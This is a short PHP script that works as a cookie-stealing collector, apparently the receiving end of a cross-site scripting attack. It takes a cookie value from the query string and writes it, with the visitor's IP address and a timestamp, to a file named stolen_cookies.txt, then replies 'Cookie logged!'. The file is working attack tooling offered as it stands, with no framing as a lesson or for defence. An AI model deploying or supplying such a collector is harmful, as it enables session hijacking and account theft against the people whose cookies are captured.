<?php
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$log = "[$time] IP: $ip | Cookie: $cookie\n";
file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);

echo "Cookie logged!";
?>
